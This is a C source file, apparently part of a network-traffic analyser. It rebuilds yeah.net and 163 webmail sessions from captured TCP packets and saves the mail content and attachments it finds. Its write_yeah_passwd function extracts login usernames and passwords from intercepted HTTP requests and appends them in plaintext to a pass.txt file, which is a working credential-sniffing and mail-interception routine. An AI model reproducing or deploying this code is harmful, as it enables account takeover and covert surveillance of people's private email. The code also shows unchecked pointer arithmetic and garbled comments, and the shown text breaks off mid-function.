//#include"common.h"
#include "mail_type.h"

int str_to_num(char * size)
{
	int res = 0, i = strlen(size) - 1;
	while(i >= 0)
	{
		int num;
		if(!(size[i] >= '0' && size[i] <= '9'))
		{
			num = size[i] - 'a' + 10;
		}
		else
		{
			num = size[i] - '0';
		}
		int j = strlen(size) - 1, temp = 1;
		while(j > i)
		{
			temp *= 16;
			j--;
		}
		temp *= num;
		res += temp;
		
		i--;
	}
	
	return res;
}

char *yeah_conv_to_utf8(char *src)
{
	char *tmp_str = NULL;
	char *dest = NULL;
	int len, utf8_len;
	int result;

	len = strlen(src);
	tmp_str = (char *)malloc(len + 1);
	if (NULL == tmp_str)
		return NULL;
	htmldecode_full(src, tmp_str);

	len = strlen(tmp_str);
	utf8_len = len * 3 / 2 + 1;
	dest = (char *)malloc(utf8_len + 1);
	if (NULL == dest)
		return NULL;
	result = code_convert("gb18030", "utf-8", tmp_str, len, dest, utf8_len);
	free(tmp_str);
	tmp_str = NULL;

	if (-1 == result)
		return NULL;
	else 
		return dest;
}

int yeah_str_convert(char *str, size_t max_len)
{
	char *tmp1 = NULL;
    char *tmp2 = NULL;
	size_t len;

	tmp1 = yeah_conv_to_utf8(str);
	if (NULL == tmp1)
		return -1;
    tmp2 = conv_xml_symbol(tmp1);
    if (tmp2 == NULL)
        return -1;
    free(tmp1);
	tmp1 = NULL;

	len = strlen(tmp2);
	if (len > max_len)
		len = max_len;
	memcpy(str, tmp2, len);
	str[len] = 0;
	free(tmp2);
	tmp2 = NULL;

	return 0;
}

int yeah_str_convert2(char *str, size_t max_len)
{
	char *tmp1 = NULL;
    char *tmp2 = NULL;
	size_t len;

	tmp1 = yeah_conv_to_utf8(str);
	if (NULL == tmp1)
		return -1;
    tmp2 = conv_to_xml_symbol(tmp1);
    if (tmp2 == NULL)
        return -1;
    free(tmp1);
	tmp1 = NULL;

	len = strlen(tmp2);
	if (len > max_len)
		len = max_len;
	memcpy(str, tmp2, len);
	str[len] = 0;
	free(tmp2);
	tmp2 = NULL;

	return 0;
}

int writefileyeah(Mail_info *mail_info)
{
#if 0
	Attach_info *attach_info;
	char *p1 = NULL, *p2 = NULL, *p3 = NULL, *sit;
	size_t len, total_len;
	int result;
	char attach_tag[MAX_BOUN_LEN + 101];
	char filepath[MAX_PATH_LEN + 1];
	char filename[MAX_FN_LEN + 1];
	char writepath[MAX_PATH_LEN + 1];
	char boundary[MAX_BOUN_LEN + 1];
	char ID[MAX_ID_LEN + 1];
	char *tmp_str;
	char tmp_id[MAX_ID_LEN + 1];
	Attachment *attachment;
	mode_t file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
	int fd;
	int n, i = 0;
	int flag = 0;
	int boun_len, utf8_len;

    htmldecode_full(mail_info->mail_data, mail_info->mail_data);
	p1 = strstr(mail_info->mail_data, ".jsp?sid=");
	if (p1 == NULL)
		return -1;
	p1 += 9;
	//p2 = strstr(p1, " HTTP/1.1\r\n");
	p2 = strchr(p1, '&');
	len = p2 - p1;
	total_len = len;
	if (p2 == NULL || len > MAX_ID_LEN)
		return -1;
	memcpy(ID, p1, len);
	ID[len] = 0;
	
	p1 = strstr(p2, "\r\n\r\n");
	if (p1 == NULL)
		return -1;
	sit=p1;
	/*p1 += 14;
	p2 = strstr(sit, "&content=");
	len = p2 - p1;
	total_len += len;
	if (p2 == NULL || total_len > MAX_ID_LEN)
		return -1;
	memcpy(tmp_id, p1, len);
	tmp_id[len] = 0;
	strcat(ID, tmp_id);
	p1 = p2 + 9;*/

	p2 = strstr(sit, "&isHtml=");
	len = p2 - p1;
	if (p2 == NULL)
		return -1;
	mail_info->content = (char *)malloc(len + 1);
	if (mail_info->content == NULL)
		return -1;
	memcpy(mail_info->content, p1, len);
	mail_info->content[len] = 0;
	p2 += 8;

	p1 = strstr(sit, "&account=");
	if (p1 == NULL)
		return -1;
	p1 += 9;
	p2 = strstr(p1, "&");
	len = p2 - p1;
	if (p2 == NULL || len > MAX_FROM_LEN)
		return -1;
	p3 = memfind(p1, "%3C", len);
	if (p3 != NULL) 
	{
		p2 = memfind(p1, "%3E", len);
		if (p2 != NULL && p2 > p3 && p2 - p1 < len) 
		{
			p1 = p3 + 3;
			len = p2 - p1;
		}
	}
	memcpy(mail_info->from, p1, len);
	mail_info->from[len] = 0;

	if (p2 == NULL)
		p2 = p1;

	p1 = strstr(sit, "&to=");
	if (p1 == NULL)
		return -1;
	p1 += 4;
	p2 = strstr(p1, "&");
	if (p2 == NULL)
		return -1;
	len = p2 - p1;
	if (len > MAX_TO_LEN)
		len = MAX_TO_LEN;
	memcpy(mail_info->to, p1, len);
	mail_info->to[len] = 0;

	p1 = strstr(sit, "&cc=");
	if (p1 != NULL) 
	{
		p1 += 4;
		p2 = strstr(p1, "&");
		len = p2 - p1;
		if (p2 != NULL) 
		{
			if (len > MAX_CC_LEN)
				len = MAX_CC_LEN;
			memcpy(mail_info->cc, p1, len);
			mail_info->cc[len] = 0;
		} 
		else 
		{
			mail_info->cc[0] = 0;
		}
	}

	p1 = strstr(sit, "&bcc=");
	if (p1 != NULL) 
	{
		p1 += 5;
		p2 = strstr(p1, "&");
		len = p2 - p1;
		if (p2 != NULL) 
		{
			if (len > MAX_BCC_LEN)
				len = MAX_BCC_LEN;
			memcpy(mail_info->bcc, p1, len);
			mail_info->bcc[len] = 0;
		} 
		else 
		{
			mail_info->bcc[0] = 0;
		}
	}

	p1 = strstr(sit, "&subject=");
	if (p1 == NULL)
		return -1;
	p1 += 9;
	p2 = strstr(p1, "&");
	len = p2 - p1;
	if (p2 == NULL)
		return -1;
	if (len > MAX_SUBJ_LEN)
		len = MAX_SUBJ_LEN;
	memcpy(mail_info->subject, p1, len);
	mail_info->subject[len] = 0;
	p2++;

	create_dir(mail_info->save_path, "yeah", mail_info->from);

	while (1) 
	{
		attach_info =find_attach(ID);
		if(attach_info == NULL) 
		{
		   break;
		}
		i++;
		Attachment  *attachment=(Attachment *)malloc(sizeof(Attachment));
		get_file_name(attach_info->path_of_sender, filename);
		//snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d_%s", i, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		attachment->next = NULL;
		snprintf(writepath, MAX_PATH_LEN, "%s/%s", mail_info->save_path, attachment->loc_filename);
		link(attach_info->path_of_here, writepath);
		unlink(attach_info->path_of_here);
		delete_attach(attach_info);
		if (!flag) 
		{
			mail_info->attach = attachment;
			flag = 1;
		} 
		else 
		{
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
	}
	mail_info->num_of_attach = i;

	result = yeah_str_convert(mail_info->to, MAX_TO_LEN);
	if (result == -1)
		return -1;
	result = yeah_str_convert(mail_info->cc, MAX_CC_LEN);
	if (result == -1)
		return -1;
	result = yeah_str_convert(mail_info->bcc, MAX_BCC_LEN);
	if (result == -1)
		return -1;
	result = yeah_str_convert(mail_info->subject, MAX_SUBJ_LEN);
	if (result == -1)
		return -1;
	tmp_str = yeah_conv_to_utf8(mail_info->content);
	if (NULL == tmp_str)
		return -1;
	free(mail_info->content);
	mail_info->content = clear_html_tag(tmp_str);
	free(tmp_str);
	tmp_str = NULL;
	if (NULL == mail_info->content)
		return -1;

	write_to_file(mail_info);
	
	return 0;
#endif

	Attach_info *attach_info;
	char *p1 = NULL, *p2 = NULL, *p3 = NULL, *tmp_str = NULL, *sit;
	size_t len, total_len;
	int result, fd, n, i = 0, flag = 0;
	Attachment *attachment = NULL;
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	char filepath[MAX_PATH_LEN + 1], filename[MAX_FN_LEN + 1];
	char writepath[MAX_PATH_LEN + 1], ID[MAX_ID_LEN + 1];

	htmldecode_full(mail_info->mail_data, mail_info->mail_data);
	
	p1 = strstr(mail_info->mail_data, "sid=");
	sit=p1;
	if (p1 != NULL) 
	{
		p1 += 4;
		p2 = strstr(p1, "&func=");
		len = p2 - p1;
		if (p2 == NULL)
			return -1;
		if (len > MAX_ID_LEN)
			len = MAX_ID_LEN;
		memcpy(ID, p1, len);
		ID[len] = 0;//printf("\nID = %s\n",ID);
		p2 += 8;
	} 
	else 
	{
		ID[0] = 0;
		LOG_WARN("webmail:writefile163(): can not find ID\n");
	}
	
	p1 = strstr(mail_info->mail_data, "<string name=\"account\">");
	if (p1 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailfrom start\n");
		return -1;
	}
	p1 += 23;
	p2 = strstr(p1, "</string>");
	len = p2 - p1;
	if (p2 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailfrom end\n");
		return -1;
	}
	p3 = memfind(p1, "&lt;", len);
	if (p3 != NULL) 
	{
		p2 = memfind(p1, "&gt;", len);
		if (p2 != NULL && p2 > p3 && p2 - p1 < len) 
		{
			p1 = p3 + 4;
			len = p2 - p1;
		}
	}
	if (len > MAX_FROM_LEN)
		len = MAX_FROM_LEN;
	memcpy(mail_info->from, p1, len);
	mail_info->from[len] = 0;
	p2 += 8;
	//printf("mail_info->from : %s\n", mail_info->from);

	p1 = strstr(p2, "<array name=\"to\">");
	if (p1 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailto start\n");
		return -1;
	}
	p1 += 17;
	//p3 = strstr(p1, "</string></array>");
	p3 = strstr(p1, "</array>");
	if (p3 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailto end\n");
		return -1;
	}
	total_len = 0;
	p2 = p1;
	while (p2 < p3) 
	{
		p1 = strstr(p2, "<string>");
		if (p1 == NULL)
			break ;
		p1 += 8;
		p2 = strstr(p1, "</string>");
		if (p2 == NULL)
			break ;
		len = p2 - p1;
		if (p2 == NULL || (total_len + len + 1) > MAX_TO_LEN)  //为�?��?个�?�箱?��????��??��??
			break ;
		memcpy(mail_info->to + total_len, p1, len);
		total_len += len;
		mail_info->to[total_len] = ';';
		total_len++;
		mail_info->to[total_len] = 0;
		p2 += 9;
	}
	p2 = p3 + 17;

	p1 = strstr(mail_info->mail_data, "<array name=\"cc\">");
	if (p1 != NULL) 
	{
		p1 += 17;
		p3 = strstr(p1, "</string></array>");
		if (p3 == NULL)
			return -1;
		total_len = 0;
		p2 = p1;
		while (p2 < p3) 
		{
			p1 = strstr(p2, "<string>");
			if (p1 == NULL)
				break ;
			p1 += 8;
			p2 = strstr(p1, "</string>");
			if (p2 == NULL)
				break ;
			len = p2 - p1;
			if (p2 == NULL || (total_len + len + 1) > MAX_CC_LEN)
				break ;
			memcpy(mail_info->cc + total_len, p1, len);
			total_len += len;
			mail_info->cc[total_len] = ';';
			total_len++;
			mail_info->cc[total_len] = 0;
			p2 += 9;
		}
		p2 = p3 + 17;
	} 
	else 
	{
		mail_info->cc[0] = 0;
	}

	p1 = strstr(mail_info->mail_data, "<array name=\"bcc\">");
	if (p1 != NULL) 
	{
		p1 += 18;
		p3 = strstr(p1, "</string></array>");
		if (p3 == NULL)
			return -1;
		total_len = 0;
		p2 = p1;
		while (p2 < p3) 
		{
			p1 = strstr(p2, "<string>");
			if (p1 == NULL)
				break;
			p1 += 8;
			p2 = strstr(p1, "</string>");
			if (p2 == NULL)
				break;
			len = p2 - p1;
			if (p2 == NULL || (total_len + len + 1) > MAX_BCC_LEN)
				break;
			memcpy(mail_info->bcc + total_len, p1, len);
			total_len += len;
			mail_info->bcc[total_len] = ';';
			total_len++;
			mail_info->bcc[total_len] = 0;
			p2 += 9;
		}
		p2 = p3 + 17;
	} 
	else 
	{
		mail_info->bcc[0] = 0;
	}

	p1 = strstr(p2, "<string name=\"subject\">");
	if (p1 == NULL)
		p1 = strstr(mail_info->mail_data, "<string name=\"subject\">");
	if (p1 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailsubject start\n");
		return -1;
	}
	p1 += 23;
	p2 = strstr(p1, "</string>");
	len = p2 - p1;
	if (p2 == NULL) {
		LOG_WARN("webmail:writefile163(): can not find mailsubject end\n");
		return -1;
	}
	if (len > MAX_SUBJ_LEN)
		len = MAX_SUBJ_LEN;
	memcpy(mail_info->subject, p1, len);
	mail_info->subject[len] = 0;
	p2 += 8;
	//printf("mail_info->subject : %s\n", mail_info->subject);

	p1 = strstr(p2, "<string name=\"content\">");
	if (p1 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailcontent start\n");
		return -1;
	}
	p1 += 23;
	p2 = strstr(p1, "</string>");
	len = p2 - p1;
	if (p2 == NULL) 
	{
		LOG_WARN("webmail:writefile163(): can not find mailcontent end\n");
		return -1;
	}
	mail_info->content = (char *)malloc(len + 1);
	if (mail_info->content == NULL) 
	{
		LOG_WARN("webmail:writefile163()");
		return -1;
	}
	memcpy(mail_info->content, p1, len);
	mail_info->content[len] = 0;
	p2 += 8;
	//printf("mail_info->content : %s\n", mail_info->content);

	create_dir(mail_info->save_path, "yeah" ,mail_info->from);//lihan

	if (strstr(p2, "<object name=\"attachments\">") != NULL)
	//if (strstr(sit, "<object name=\"attrs\">") != NULL)
	{
		//printf("11111\n");
	
		int fd, atta_fd;
		struct stat st;
		char *mapped = NULL;
		char *p1, *p2;
		char filename[MAX_FN_LEN + 1];
		char writepath[MAX_PATH_LEN + 1];
		Attachment *attachment;
		int flag = 0, i = 0;

		//printf("ID : %s\n", ID);
		attach_info = find_attach(ID);
		if (attach_info == NULL)
			return -1;	   //?��?��?��?��???��??��?????
		
		//printf("2222222222222\n");
		
		fd = open(attach_info->path_of_here, O_RDWR);
		if (fstat(fd, &st) < 0) 
		{
			return -1;
		}

		mapped = (char *)mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
		if (mapped == NULL) 
		{
			close(fd);
			return -1;
		}
		p1 = mapped;
			
		while (1)
		{
			p1 = strstr(p1, "filename=\"");
			if (p1 == NULL)
				break;
			p1 += 10;
			if (*p1 == '\"')
				continue;
			p2 = strstr(p1, "\"\r\nContent-Type: ");
			if (p2 == NULL)
				break;
			attachment = (Attachment *)malloc(sizeof(Attachment));
			if (attachment == NULL) 
			{
				LOG_WARN("webmail:writefile163(): attachment node malloc() return NULL\n");
				return -1;
			}
			if (!flag) 
			{
				mail_info->attach = attachment;
				attachment->next = NULL;
				flag = 1;
			} 
			else 
			{
				attachment->next = mail_info->attach->next;
				mail_info->attach->next = attachment;
			}
			len = p2 - p1;
			if (len > MAX_PATH_LEN)
				len = MAX_PATH_LEN;
			memcpy(attachment->path_of_sender, p1, len);
			attachment->path_of_sender[len] = 0;
			i++;
			tmp_str = conv_163_to_utf8(attachment->path_of_sender);
			if (tmp_str == NULL) 
			{
				LOG_WARN("webmail:writefile163(): conv_163_to_utf8() return NULL\n");
				return -1;
			}
			get_file_name(tmp_str, filename);
			snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d_%s", i, filename);
			free(tmp_str);
			tmp_str = NULL;
			p1 = strstr(p2, "\r\n\r\n");
			if (p1 == NULL) 
			{
				LOG_WARN("webmail:writefile163(): can not find attach content start\n");
				return -1;
			}
			p1 += 4;
			len = st.st_size - (p1 - mapped);
			p2 = memfind(p1, "Content-Disposition: form-data; name", len);//��????��??��??boundary ??��?��??�好��??��????件信?��????头已��?丢�?��?
			if (p2 == NULL) 
			{
				LOG_WARN("webmail:writefile163(): can not find attach content end\n");
				return -1;
			}
			snprintf(writepath, MAX_PATH_LEN, "%s/%s", mail_info->save_path, attachment->loc_filename);
			atta_fd = open(writepath, O_RDWR | O_CREAT, file_mode);
			if (atta_fd == -1) 
			{
				p1 = p2;
				continue;
			}
			write(atta_fd, p1, p2 - p1);
			close(atta_fd);
			trim_attach(writepath, 45);
			p1 = p2;
		}
		munmap(mapped, st.st_size);
		close(fd);
		mail_info->num_of_attach = i;
		unlink(attach_info->path_of_here);
		delete_attach(attach_info);
	} 
	else 
	{
	
		char filename[MAX_FN_LEN + 1];
		Attach_info *attach_tmp;
		Attachment *attachment;
		Attach_info *attach_info = attach_tab.head->next;
		int i = 0, flag = 0;

		while (attach_info != NULL) 
		{
			//printf("attach info ...\n");
			//printf("%s	...	%s\n", attach_info->ID_str, ID);
			if (!strcmp(attach_info->ID_str, ID))
			{
				i++;
				get_file_name(attach_info->path_of_sender, filename);
				attachment = (Attachment *)malloc(sizeof(Attachment));
				if (attachment == NULL)
					break;
				//snprintf(attachment->loc_name, MAX_FN_LEN, "attach%d_%s", i, filename);
				snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
				snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
				if (!flag) 
				{//printf("11111111\n");
					attachment->next = NULL;
					mail_info->attach = attachment;
					flag++;
				} 
				else 
				{//printf("22222222\n");
					attachment->next = mail_info->attach->next;
					mail_info->attach->next = attachment;
				}
				snprintf(writepath, MAX_PATH_LEN, "%s/%s", mail_info->save_path, attachment->loc_name);//lihan
				//printf("attachment->loc_name : %s\n", attachment->loc_name);
				//printf("attachment->loc_filename : %s\n", attachment->loc_filename);
				//printf("writepath : %s\n", writepath);
				link(attach_info->path_of_here, writepath);
				unlink(attach_info->path_of_here);
				del_attach_node(attach_info);
				attach_tmp = attach_info->next;
				delete_attach(attach_info);
				attach_info = attach_tmp;
				continue;
			}
			attach_info = attach_info->next;
		}
		
		mail_info->num_of_attach = i;
	}

	result = str_163_convert1(mail_info->to, MAX_TO_LEN);
	if (result == -1) 
	{
		LOG_WARN("webmail:writefile163: mailto convert failed\n");
		return -1;
	}
	result = str_163_convert1(mail_info->cc, MAX_CC_LEN);
	if (result == -1) 
	{
		LOG_WARN("webmail:writefile163: mailcc convert failed\n");
		return -1;
	}
	result = str_163_convert1(mail_info->bcc, MAX_BCC_LEN);
	if (result == -1) 
	{
		LOG_WARN("webmail:writefile163: mailbcc convert failed\n");
		return -1;
	}
	result = str_163_convert1(mail_info->subject, MAX_SUBJ_LEN);
	if (result == -1) 
	{
		LOG_WARN("webmail:writefile163: mailsubject convert failed\n");
		return -1;
	}

	if (mail_info->content != NULL) 
	{
		tmp_str = conv_to_xml_symbol(mail_info->content);
		if (tmp_str == NULL) 
		{
			LOG_WARN("webmail:writefile163(): mailcontent convert_to_xml_symbol() failed\n");
			return -1;
		}
		free(mail_info->content);
		mail_info->content = clear_html_tag(tmp_str);
		free(tmp_str);
		tmp_str = NULL;
		if (mail_info->content == NULL) 
		{
			LOG_WARN("webmail:writefile163(): mailcontent clear_html_tag() failed\n");
			return -1;
		}
	}
    
	write_to_file(mail_info);

}

int write_yeah_passwd(Mail_info *mail_info)
{//printf("function: write_yeah_passwd\n");
	char *p1 = NULL, *p2 = NULL;
	int len;

	p1 = strstr(mail_info->mail_data, "username=");
	if (p1 == NULL)
	{
		p1 = strstr(mail_info->mail_data, "&user=");
		p1 += 6;
	}
	else
	{
		p1 += 9;
	}
	if (p1 == NULL)
		return -1;
	p2 = strstr(p1, "&");
	len = p2 - p1;
	if (p2 == NULL || len > MAX_UN_LEN)
		return -1;
	memcpy(mail_info->username, p1, len);
	mail_info->username[len] = 0;
	htmldecode_full(mail_info->username,mail_info->username);
	if (strstr(mail_info->username, "@yeah.net") == NULL) {
		if (len + 9 > MAX_UN_LEN)
			return -1;
		strcat(mail_info->username, "@yeah.net");
	}

	p1 = strstr(p2, "&password=");
	if (p1 == NULL)
		return -1;
	p1 += 10;
	p2 = strstr(p1, "&");
	if(p2 == NULL)
	{
		if (len > MAX_PW_LEN)
			return -1;
		len = mail_info->mail_data + strlen(mail_info->mail_data) - p1;
	}
	else
	{
		if (p2 == NULL || len > MAX_PW_LEN)
			return -1;
		len = p2 - p1;
	}

	memcpy(mail_info->passwd, p1, len);
	mail_info->passwd[len] = 0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);
	write_xml(mail_info);

	FILE *fp = NULL;
	char writepath[MAX_PATH_LEN + 1];
	snprintf(writepath, MAX_PATH_LEN, "%s/pass.txt", mail_data_path);
	fp = fopen(writepath, "a+");
	if(fp == NULL)
		return -1;
	fprintf(fp,"\nusername=%s\npassword=%s\n", mail_info->username, mail_info->passwd);
    //LOG_INFO("usernamess = %s and password = %s\n",mail_info->username,mail_info->passwd);
	fclose(fp);

	return 0;
}

int analyse_yeah_passwd(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{//printf("function:  analyse_yeah_passwd\n");
	unsigned int seq = ntohl(ptcp->seq);
	int off_seq;
	int result;

	if (is_to_s) {
		if (!mail_info->is_complished) {
			if (!strncmp(data, "<?xml version=\"1.0\"?><object/>", 32)) {
				return -1;
			}
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
		if(strstr(mail_info->mail_data,"&password="))
		{
			write_yeah_passwd(mail_info);
			del_mail_node(mail_info);
		}
	} else if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9)){
		mail_info->is_complished = 1;
	//	get_time(data, mail_info->sent_time);
		write_yeah_passwd(mail_info);
		del_mail_node(mail_info);
		return 0;
	} else {
		return -1;
	}
}

int analyse_yeah_content(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	unsigned int seq = ntohl(tcp->seq);
	int off_seq = seq - mail_info->start_seq;
	char http_ok_head[18] = "HTTP/1.1 200 OK\r\n";
	int result;

	if (is_b_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, datalen, tcp);
			
			return result;
		}
	} 
	else if (!strncmp(data, "HTTP/1.", 7))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		writefileyeah(mail_info);
		del_mail_node(mail_info);
		
		return 0;
	} 
	else 
	{
		return -1;
	}
}

int analyse_yeah_attach1_head(Attach_info *attach_info,char *data, unsigned int datalen,unsigned int seq)
{
	int fd;
	//char file_name_pattern[] = "filename=\"(.{1,150})\"\r\nContent-Type: ";
	char file_name_pattern[] = "Mail-Upload-name: (.*)\r\nOrigin:";
	char *p = NULL;
	char *temp = NULL;
	struct timeval tv;
	struct timezone tz;
	int result;
	char ID[MAX_ID_LEN + 1];
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	int off_seq;
	size_t len;

	off_seq = seq - attach_info->start_seq;
	if (off_seq + datalen > attach_info->ok_len)
		return -1;
	memcpy(attach_info->ok_data + off_seq, data, datalen);

	//p = strstr(attach_info->ok_data, "filename=\"");
	p = strstr(attach_info->ok_data, "Mail-Upload-name:");
	if (p == NULL)
		return 0;
	p = strstr(p, "\r\n\r\n");
	if (p == NULL) {
		return 0;
	}
	p += 4;
	attach_info->start_seq = p - attach_info->ok_data + attach_info->start_seq;//1

	result = regcompile_2(attach_info->ok_data, file_name_pattern, &attach_info->path_of_sender);
	if (result == -1)
		return -1;
/*
	len = strlen(attach_info->path_of_sender);
	len = len * 3 / 2 + 1;
	temp = (char *)malloc(len + 1);
	if (temp == NULL)
		return -1;
	result = code_convert("gb18030", "utf-8", attach_info->path_of_sender, strlen(attach_info->path_of_sender), temp, len);
	if (result == -1)
		return -1;
	free(attach_info->path_of_sender);
	attach_info->path_of_sender = temp;
	temp = NULL;
*/

	//result = regcompile_1(attach_info->ok_data, "sid=(.*)&composeId=", ID, MAX_ID_LEN);
	result = regcompile_1(attach_info->ok_data, "sid=(.*)&uid=", ID, MAX_ID_LEN);
	if (result == -1) {
		return -1;
	}
	strcpy(attach_info->ID_str, ID);//printf("\nattach_info->ID_str = %s\n",attach_info->ID_str);
	/*result = regcompile_1(attach_info->ok_data, "&composeId=(.*)&Cookie", ID, MAX_ID_LEN);
	if (result == -1) {
		return -1;
	}
	if (strlen(attach_info->ID_str) + strlen(ID) > MAX_ID_LEN)
		return -1;
	strcat(attach_info->ID_str, ID);*/

	gettimeofday(&tv, &tz);
	snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu", mail_temp_path, tv.tv_sec, tv.tv_usec);//3
	fd = open(attach_info->path_of_here, O_RDWR|O_CREAT, file_mode);
	if (fd == -1)
		return -1;
	write(fd,p,off_seq + datalen - (p - attach_info->ok_data));
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing = 1; //4
	return 0;
}

int analyse_yeah_attach2_head(Attach_info *attach_info,char *data, unsigned int datalen,unsigned int seq)
{
	int fd;
	char file_name_pattern[] = "filename=\"(.{1,150})\"\r\nContent-Type: ";
	char *p = NULL;
	int off_seq;
	int result;
	struct timeval tv;
	struct timezone tz;
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	char ID[MAX_ID_LEN + 1];

	off_seq = seq - attach_info->start_seq;
	if (off_seq + datalen > attach_info->ok_len)
		return -1;
	memcpy(attach_info->ok_data + off_seq, data, datalen);

	p = strstr(attach_info->ok_data, "filename=\"");
	if (p == NULL)
		return 0;
	p = strstr(p, "\r\n\r\n");
	if (p == NULL) {
		return 0;
	}
	p += 4;
	attach_info->start_seq = p - attach_info->ok_data + attach_info->start_seq;//1
	result = regcompile_2(attach_info->ok_data, file_name_pattern, &attach_info->path_of_sender);//2
	if (result == -1)
		return -1;

	result = regcompile_1(attach_info->ok_data, "sid=(.*)&composeId=", ID, MAX_ID_LEN);
	if (result == -1) {
		return -1;
	}
	strcpy(attach_info->ID_str, ID);
	result = regcompile_1(attach_info->ok_data, "&composeId=(.*)&offset=", ID, MAX_ID_LEN);
	if (result == -1) {
		return -1;
	}
	if (strlen(attach_info->ID_str) + strlen(ID) > MAX_ID_LEN)
		return -1;
	strcat(attach_info->ID_str, ID);

	gettimeofday(&tv, &tz);
    snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu", mail_temp_path, tv.tv_sec, tv.tv_usec);//3
	fd = open(attach_info->path_of_here, O_RDWR | O_CREAT, file_mode);
	if (fd == -1)
		return -1;
	write(fd, p, off_seq + datalen - (p - attach_info->ok_data));
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing = 1; //4
	return 0;
}

int analyse_yeah_attach_1(Attach_info *attach_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	unsigned int seq = ntohl(tcp->seq);
	int result;

	if (is_b_s){
		if (attach_info->is_writing) {
			//result = write_to_attach(attach_info, data, datalen, seq);
			result = write_to_attach(attach_info, data, datalen+47, seq);
		} else {
			result = analyse_yeah_attach1_head(attach_info,data,datalen,seq);
		}
		return result;
	} else if (!attach_info->is_get_ok){
		trim_attach(attach_info->path_of_here, 47);
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9)) {
			attach_info->is_writing = 0;
			attach_info->is_get_ok = 1;
			attach_info->is_complished = 1;
			return 0;
		} else {
			return -1;
		}
	}
}

int analyse_yeah_attach_2(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	int result;

	if (is_to_s) {
		if (attach_info->is_writing) {
			result = write_to_attach(attach_info, data, data_len, seq);
		} else {
			result = analyse_yeah_attach2_head(attach_info,data,data_len,seq);
		}
		return result;
	} else if (!attach_info->is_get_ok) {
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9)) {
			trim_attach(attach_info->path_of_here, 49);
			attach_info->is_get_ok = 0;
			attach_info->is_complished = 1;
			return 0;
		} else {
			return -1;
		}
	}
}

int analyse_yeah_down_attach(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	//int getted_size, attach_size;
	static int dataLen = 0;
	static int isChunked = -1;
	if (attach_info->is_writing == 1)
	{
		attach_info->ok_len += data_len;
		if(strstr(data + data_len - 4, "\r\n\r\n") || attach_info->recive_length-1000 == attach_info->ok_len - dataLen)
		{//printf("\n2\n");
			int fd = open(attach_info->path_of_here, O_RDWR);
			if (fd == -1)
			{
				return -1;
			}
			lseek(fd, 0, SEEK_END);
			if(isChunked)
			{
				data_len -= 7;
			}
			write(fd, data, data_len);
			close(fd);
			UpdateAttachNew(attach_info->attach_name, attach_info->attname, attach_info->ID_str);
			return -1;
		}
		else
		{
			int fd = open(attach_info->path_of_here, O_RDWR);
			if (fd == -1)
				return -1;
			lseek(fd, 0, SEEK_END);
			write(fd, data, data_len);
			close(fd);
		}
	}
	else
	{
		if(!strncmp(data, "HTTP/1.1 200 OK\r\n", 17))
		{
			struct timeval tv;
			struct timezone tz;
			char * front,* back;
			int len, fd;
			mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

			front = strstr(data, "; filename=\"");
			if(front == NULL)
				return 0;
			front += 12;
			back = strstr(front, "\"\r\n");
			if(back == NULL)
				return 0;
			len = back - front;
			len = (len > MAX_PATH_LEN ? MAX_PATH_LEN : len);
			memcpy(attach_info->attach_name, front, len);
			attach_info->attach_name[len] = '\0';
			memcpy(attach_info->attname, front, len);
			attach_info->attname[len] = '\0';

			htmldecode_full(attach_info->attach_name, attach_info->attach_name);
			htmldecode_full(attach_info->attname, attach_info->attname);
			gettimeofday(&tv, &tz);
    			snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu",
    				attach_down_path, tv.tv_sec, tv.tv_usec);
			char temp_name[MAX_PATH_LEN];
			memset(temp_name, MAX_PATH_LEN, 0);
			strcpy(temp_name, attach_info->attach_name);
			temp_name[len] = '\0';
			snprintf(attach_info->attach_name, MAX_PATH_LEN, "%lu-%lu", tv.tv_sec, tv.tv_usec);

    			front = strstr(data, "\r\n\r\n");
			front += 4;
			attach_info->recive_length = get_http_length(data);
			attach_info->recive_length += 1000;
			attach_info->recive_data = (char *)malloc(attach_info->recive_length);
